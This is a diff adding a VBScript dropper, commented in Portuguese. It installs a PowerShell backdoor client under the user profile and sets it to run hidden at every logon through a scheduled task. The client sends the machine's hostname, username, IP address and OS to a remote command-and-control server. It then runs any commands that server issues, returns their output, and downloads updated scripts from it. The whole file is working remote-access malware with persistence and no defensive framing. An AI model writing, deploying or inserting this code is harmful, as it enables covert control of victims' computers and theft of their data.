@@ -1,0 +1,147 @@
+Option Explicit
+
+Dim fso, shell, psScriptPath, taskName, psClientScript
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set shell = CreateObject("WScript.Shell")
+
+psScriptPath = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\ngrok_backdoor_client.ps1"
+taskName = "NgrokBackdoorClientTask"
+
+' --- SCRIPT POWERSHELL CLIENTE COMPLETO ---
+psClientScript = _
+"param()" & vbCrLf & _
+"$ErrorActionPreference = 'SilentlyContinue'" & vbCrLf & _
+"$apiBase = 'https://7f3e0d9a-f5ab-4d9a-a7ad-04259223c4d9-00-3dsgchxw17fqz.janeway.replit.dev'" & vbCrLf & _
+"$hostname = $env:COMPUTERNAME" & vbCrLf & _
+"$username = $env:USERNAME" & vbCrLf & _
+"$os = (Get-CimInstance Win32_OperatingSystem).Caption" & vbCrLf & _
+"try {" & vbCrLf & _
+"    $ip = (Test-Connection -ComputerName $hostname -Count 1 -ErrorAction Stop).IPv4Address.IPAddressToString" & vbCrLf & _
+"} catch {" & vbCrLf & _
+"    $ip = 'Unknown'" & vbCrLf & _
+"}" & vbCrLf & _
+"function Invoke-ApiPost($endpoint, $body) {" & vbCrLf & _
+"    try {" & vbCrLf & _
+"        Invoke-RestMethod -Uri ($apiBase + $endpoint) -Method POST -Body ($body | ConvertTo-Json -Depth 5) -ContentType 'application/json' | Out-Null" & vbCrLf & _
+"    } catch {}" & vbCrLf & _
+"}" & vbCrLf & _
+"function Invoke-ApiGet($endpoint) {" & vbCrLf & _
+"    try {" & vbCrLf & _
+"        return Invoke-RestMethod -Uri ($apiBase + $endpoint) -Method GET" & vbCrLf & _
+"    } catch { return $null }" & vbCrLf & _
+"}" & vbCrLf & _
+"function Send-Status {" & vbCrLf & _
+"    $body = @{" & vbCrLf & _
+"        hostname = $hostname;" & vbCrLf & _
+"        username = $username;" & vbCrLf & _
+"        ip = $ip;" & vbCrLf & _
+"        os = $os;" & vbCrLf & _
+"        time = (Get-Date).ToString()" & vbCrLf & _
+"    }" & vbCrLf & _
+"    Invoke-ApiPost '/report/status' $body" & vbCrLf & _
+"}" & vbCrLf & _
+"function Send-Heartbeat {" & vbCrLf & _
+"    $body = @{" & vbCrLf & _
+"        hostname = $hostname;" & vbCrLf & _
+"        time = (Get-Date).ToString()" & vbCrLf & _
+"    }" & vbCrLf & _
+"    Invoke-ApiPost '/heartbeat' $body" & vbCrLf & _
+"}" & vbCrLf & _
+"function Send-Log($message) {" & vbCrLf & _
+"    $body = @{" & vbCrLf & _
+"        hostname = $hostname;" & vbCrLf & _
+"        log = $message;" & vbCrLf & _
+"        time = (Get-Date).ToString()" & vbCrLf & _
+"    }" & vbCrLf & _
+"    Invoke-ApiPost '/report/logs' $body" & vbCrLf & _
+"}" & vbCrLf & _
+"function Send-Error($errorMessage) {" & vbCrLf & _
+"    $body = @{" & vbCrLf & _
+"        hostname = $hostname;" & vbCrLf & _
+"        error = $errorMessage;" & vbCrLf & _
+"        time = (Get-Date).ToString()" & vbCrLf & _
+"    }" & vbCrLf & _
+"    Invoke-ApiPost '/error' $body" & vbCrLf & _
+"}" & vbCrLf & _
+"function Get-Config {" & vbCrLf & _
+"    return Invoke-ApiGet '/config'" & vbCrLf & _
+"}" & vbCrLf & _
+"function Get-Command {" & vbCrLf & _
+"    $cmd = Invoke-ApiGet ('/command?hostname=' + $hostname)" & vbCrLf & _
+"    if ($cmd) { return $cmd } else { return '' }" & vbCrLf & _
+"}" & vbCrLf & _
+"function Send-CommandOutput($output) {" & vbCrLf & _
+"    $body = @{" & vbCrLf & _
+"        hostname = $hostname;" & vbCrLf & _
+"        command = $command;" & vbCrLf & _
+"        output = $output;" & vbCrLf & _
+"        time = (Get-Date).ToString()" & vbCrLf & _
+"    }" & vbCrLf & _
+"    Invoke-ApiPost '/report/output' $body" & vbCrLf & _
+"}" & vbCrLf & _
+"function Get-RemoteScript {" & vbCrLf & _
+"    $script = Invoke-ApiGet '/script'" & vbCrLf & _
+"    if ($script) { return $script } else { return '' }" & vbCrLf & _
+"}" & vbCrLf & _
+"Send-Status" & vbCrLf & _
+"Send-Log ""Cliente iniciado.""" & vbCrLf & _
+"while ($true) {" & vbCrLf & _
+"    Send-Heartbeat" & vbCrLf & _
+"    $config = Get-Config" & vbCrLf & _
+"    if ($null -eq $config) {" & vbCrLf & _
+"        Send-Log ""Falha ao obter config.""" & vbCrLf & _
+"        Start-Sleep -Seconds 30" & vbCrLf & _
+"        continue" & vbCrLf & _
+"    }" & vbCrLf & _
+"    $command = Get-Command" & vbCrLf & _
+"    if ($command -and $command -ne '') {" & vbCrLf & _
+"        Send-Log ""Executando comando: $command""" & vbCrLf & _
+"        try {" & vbCrLf & _
+"            $output = Invoke-Expression $command 2>&1 | Out-String" & vbCrLf & _
+"            Send-CommandOutput $output" & vbCrLf & _
+"        } catch {" & vbCrLf & _
+"            Send-Error $_.Exception.Message" & vbCrLf & _
+"        }" & vbCrLf & _
+"    }" & vbCrLf & _
+"    $remoteScript = Get-RemoteScript" & vbCrLf & _
+"    if ($remoteScript -and $remoteScript -ne '') {" & vbCrLf & _
+"        $localScriptPath = ""$env:USERPROFILE\ngrok_backdoor.ps1""" & vbCrLf & _
+"        try {" & vbCrLf & _
+"            $remoteScript | Out-File -FilePath $localScriptPath -Encoding UTF8 -Force" & vbCrLf & _
+"            Send-Log ""Script atualizado.""" & vbCrLf & _
+"        } catch {" & vbCrLf & _
+"            Send-Error ('Falha ao atualizar script: ' + $_.Exception.Message)" & vbCrLf & _
+"        }" & vbCrLf & _
+"    }" & vbCrLf & _
+"    Start-Sleep -Seconds ($config.retry_interval -as [int])" & vbCrLf & _
+"}" & vbCrLf
+
+' --- SALVA O SCRIPT POWERSHELL ---
+WriteTextFile psScriptPath, psClientScript
+
+' --- CRIA TAREFA AGENDADA ---
+CreateScheduledTask taskName, psScriptPath
+
+' --- EXECUTA CLIENTE POWERSHELL ---
+shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psScriptPath & """", 0, False
+
+' --- FUNÇÕES ---
+Sub WriteTextFile(filePath, content)
+    Dim ts
+    Set ts = fso.CreateTextFile(filePath, True)
+    ts.Write content
+    ts.Close
+End Sub
+
+Sub CreateScheduledTask(name, scriptPath)
+    Dim cmd
+    cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
+          Chr(34) & _
+          "Register-ScheduledTask -TaskName '" & name & "' " & _
+          "-Trigger (New-ScheduledTaskTrigger -AtLogOn) " & _
+          "-Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -ExecutionPolicy Bypass -File """"'" & scriptPath & "'"""") " & _
+          "-RunLevel LeastPrivilege -Force" & _
+          Chr(34)
+    shell.Run cmd, 0, True
+End Sub
